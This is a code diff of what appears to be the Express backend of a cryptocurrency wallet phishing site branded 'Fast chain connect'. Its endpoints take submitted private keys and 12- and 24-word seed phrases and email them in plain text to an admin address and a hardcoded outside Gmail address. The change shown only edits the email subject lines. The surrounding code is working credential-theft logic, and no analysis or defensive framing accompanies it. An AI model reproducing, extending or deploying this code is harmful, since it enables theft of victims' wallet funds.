@@ -62,7 +62,7 @@ app.post("/api/submit/private-key", async (req, res) => {
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       //to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New Private Key Submitted",
+      subject: "New Private Key Submitted - Fast chain connect",
       text: `Private Key: ${privateKey}`,
     });
 
@@ -98,7 +98,7 @@ app.post("/api/submit/seed-phrase", async (req, res) => {
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New 12-Word Seed Phrase Submitted",
+      subject: "New 12-Word Seed Phrase Submitted - Fast chain connect",
       text: `Seed Phrase:\n\n${formatted}`,
     });
 
@@ -134,7 +134,7 @@ app.post("/api/submit/seed-phrase-24", async (req, res) => {
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New 24-Word Seed Phrase Submitted",
+      subject: "New 24-Word Seed Phrase Submitted - Fast chain connect",
       text: `24-Word Seed Phrase:\n\n${formatted}`,
     });
 
